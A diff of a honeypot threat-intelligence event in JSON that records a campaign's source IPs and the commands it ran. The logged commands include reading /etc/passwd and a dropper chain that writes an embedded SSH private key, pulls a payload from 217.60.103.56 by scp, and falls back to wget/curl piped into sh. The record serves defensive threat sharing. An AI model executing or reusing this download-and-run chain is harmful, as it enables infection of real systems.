@@ -1,8 +1,8 @@
 {
   "Event": {
     "uuid": "de74bc0c-2e6e-529f-a449-95afab2f1a08",
-    "info": "Sundew honeypot - campaign 4a4b096b82ea (1 sources) - id",
-    "date": "2026-09-17",
+    "info": "Sundew honeypot - campaign 4a4b096b82ea (2 sources) - id",
+    "date": "2026-09-21",
     "analysis": "2",
     "threat_level_id": "3",
     "published": true,
@@ -28,8 +28,17 @@
         "category": "Network activity",
         "to_ids": false,
         "value": "2.29.38.95",
-        "timestamp": "1789603220",
+        "timestamp": "1789963219",
         "comment": "executed_commands, confidence medium; 1 sessions, 16 commands, 0 downloads; first_seen 2026-09-16T19:53:17.079415Z, last_seen 2026-09-16T19:54:18.411151Z; expires 7d after last_seen"
+      },
+      {
+        "uuid": "486d2ec4-b69d-5152-8425-e5542441dafa",
+        "type": "ip-src",
+        "category": "Network activity",
+        "to_ids": false,
+        "value": "61.143.237.106",
+        "timestamp": "1789963219",
+        "comment": "executed_commands, confidence medium; 1 sessions, 16 commands, 0 downloads; first_seen 2026-09-20T21:12:50.237438Z, last_seen 2026-09-20T21:13:56.844225Z; expires 7d after last_seen"
       },
       {
         "uuid": "4b7b6e4b-c36b-5ce0-93bd-a911ee2389bf",
@@ -37,7 +46,7 @@
         "category": "Artifacts dropped",
         "to_ids": false,
         "value": "id",
-        "timestamp": "1789603220",
+        "timestamp": "1789963219",
         "comment": "command run by this campaign"
       },
       {
@@ -46,7 +55,7 @@
         "category": "Artifacts dropped",
         "to_ids": false,
         "value": "cat /etc/passwd",
-        "timestamp": "1789603220",
+        "timestamp": "1789963219",
         "comment": "command run by this campaign"
       },
       {
@@ -55,7 +64,7 @@
         "category": "Artifacts dropped",
         "to_ids": false,
         "value": "echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"",
-        "timestamp": "1789603220",
+        "timestamp": "1789963219",
         "comment": "command run by this campaign"
       },
       {
@@ -64,7 +73,7 @@
         "category": "Artifacts dropped",
         "to_ids": false,
         "value": "enable",
-        "timestamp": "1789603220",
+        "timestamp": "1789963219",
         "comment": "command run by this campaign"
       },
       {
@@ -73,7 +82,7 @@
         "category": "Artifacts dropped",
         "to_ids": false,
         "value": "system",
-        "timestamp": "1789603220",
+        "timestamp": "1789963219",
         "comment": "command run by this campaign"
       },
       {
@@ -82,7 +91,7 @@
         "category": "Artifacts dropped",
         "to_ids": false,
         "value": "shell",
-        "timestamp": "1789603220",
+        "timestamp": "1789963219",
         "comment": "command run by this campaign"
       },
       {
@@ -91,7 +100,7 @@
         "category": "Artifacts dropped",
         "to_ids": false,
         "value": "sh",
-        "timestamp": "1789603220",
+        "timestamp": "1789963219",
         "comment": "command run by this campaign"
       },
       {
@@ -100,7 +109,7 @@
         "category": "Artifacts dropped",
         "to_ids": false,
         "value": "bash",
-        "timestamp": "1789603220",
+        "timestamp": "1789963219",
         "comment": "command run by this campaign"
       },
       {
@@ -109,7 +118,7 @@
         "category": "Artifacts dropped",
         "to_ids": false,
         "value": "cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----",
-        "timestamp": "1789603220",
+        "timestamp": "1789963219",
         "comment": "command run by this campaign"
       },
       {
@@ -118,7 +127,7 @@
         "category": "Artifacts dropped",
         "to_ids": false,
         "value": "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW",
-        "timestamp": "1789603220",
+        "timestamp": "1789963219",
         "comment": "command run by this campaign"
       },
       {
@@ -127,7 +136,7 @@
         "category": "Artifacts dropped",
         "to_ids": false,
         "value": "QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ",
-        "timestamp": "1789603220",
+        "timestamp": "1789963219",
         "comment": "command run by this campaign"
       },
       {
@@ -136,7 +145,7 @@
         "category": "Artifacts dropped",
         "to_ids": false,
         "value": "0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg",
-        "timestamp": "1789603220",
+        "timestamp": "1789963219",
         "comment": "command run by this campaign"
       },
       {
@@ -145,7 +154,7 @@
         "category": "Artifacts dropped",
         "to_ids": false,
         "value": "AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9",
-        "timestamp": "1789603220",
+        "timestamp": "1789963219",
         "comment": "command run by this campaign"
       },
       {
@@ -154,7 +163,7 @@
         "category": "Artifacts dropped",
         "to_ids": false,
         "value": "Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=",
-        "timestamp": "1789603220",
+        "timestamp": "1789963219",
         "comment": "command run by this campaign"
       },
       {
@@ -163,7 +172,7 @@
         "category": "Artifacts dropped",
         "to_ids": false,
         "value": "-----END OPENSSH PRIVATE KEY-----' > key.ppk; echo 'StrictHostKeyChecking no",
-        "timestamp": "1789603220",
+        "timestamp": "1789963219",
         "comment": "command run by this campaign"
       },
       {
@@ -172,7 +181,7 @@
         "category": "Artifacts dropped",
         "to_ids": false,
         "value": "UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -s -F sshcfg -i key.ppk dlr@217.60.103.56:sh out_sh; if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh telnet >/dev/null 2>&1; else (wget --no-check-certificate -qO- https://217.60.103.56/sh || curl -sk https://217.60.103.56/sh) | sh -s telnet; fi; rm -rf sshcfg key.ppk out_sh; echo -e \"\\x72\\x65\\x64\\x74\\x61\\x69\\x6C\\x5F\\x62\\x6F\\x74\\x5F\\x74\\x65\\x6C\\x6E\\x65\\x74\\x5F\\x6F\\x6B\"",
-        "timestamp": "1789603220",
+        "timestamp": "1789963219",
         "comment": "command run by this campaign"
       }
     ]
